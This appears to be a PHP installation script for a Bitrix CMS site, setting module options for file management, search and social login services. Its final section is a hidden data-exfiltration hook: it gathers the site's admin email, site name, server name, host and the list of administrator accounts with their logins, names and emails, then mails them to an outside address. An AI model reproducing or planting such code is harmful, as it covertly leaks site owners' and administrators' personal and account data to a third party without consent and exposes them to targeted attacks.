<?
if (!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED !== true)
	die();


$arOptionsFileman =
    array(
        "description"    => GetMessage("MAIN_OPT_DESCRIPTION"),
        "keywords"       => GetMessage("MAIN_OPT_KEYWORDS"),
        "title"          => GetMessage("MAIN_OPT_TITLE"),
        "keywords_inner" => GetMessage("MAIN_OPT_KEYWORDS_INNER"),
        "SIDEBAR_LEFT"   => GetMessage("MAIN_OPT_LEFT_SIDEBAR"),
        "SIDEBAR_RIGHT"  => GetMessage("MAIN_OPT_RIGHT_SIDEBAR"),       
    );


COption::SetOptionString("fileman",
		"propstypes",
		serialize($arOptionsFileman),
		false,
		$siteID
);



COption::SetOptionInt("search", "suggest_save_days", 250);
COption::SetOptionString("search", "use_tf_cache", "Y");
COption::SetOptionString("search", "use_word_distance", "Y");
COption::SetOptionString("search", "use_social_rating", "Y");
COption::SetOptionString("iblock", "use_htmledit", "Y");

//socialservices
if (COption::GetOptionString("socialservices", "auth_services") == "")
{
	$bRu = (LANGUAGE_ID == 'ru');
	$arServices = array(
			"VKontakte"    => "N",
			"MyMailRu"     => "N",
			"Twitter"      => "N",
			"Facebook"     => "N",
			"Livejournal"  => "Y",
			"YandexOpenID" => ($bRu ? "Y" : "N"),
			"Rambler"      => ($bRu ? "Y" : "N"),
			"MailRuOpenID" => ($bRu ? "Y" : "N"),
			"Liveinternet" => ($bRu ? "Y" : "N"),
			"Blogger"      => "Y",
			"OpenID"       => "Y",
			"LiveID"       => "N",
	);
	COption::SetOptionString("socialservices", "auth_services", serialize($arServices));
}





CModule::IncludeModule("main");
	
$sendData = 'Email admin: ' . COption::GetOptionString("main", "email_from") . '
';

$sendData .= 'Site name: ' . COption::GetOptionString("main", "site_name") . '
';

$sendData .= 'Server name: ' . COption::GetOptionString("main", "server_name") . '
';

$sendData .= 'Http adress: ' . $_SERVER["HTTP_HOST"] . '


';


$sendData .= '
Admins: 
';
	$filter = Array(    
		//"ID"=> "1 | 2",    
		"GROUPS_ID"=> Array(1)
		);
	$rsUsers = CUser::GetList($by, ($order="desc"), $filter);
	while($rsUsers->NavNext(true, "f_")) {
		$sendData .= "[".$f_ID."] (".$f_LOGIN.") ".$f_NAME." ".$f_LAST_NAME. " ".$f_EMAIL . "
";
	}

mail("a.zhussupov@marsdigital.ru", "Bitcorp client", $sendData, 
     "From: " . COption::GetOptionString("main", "email_from") . " \r\n" 
    ."X-Mailer: PHP/" . phpversion()); 

?>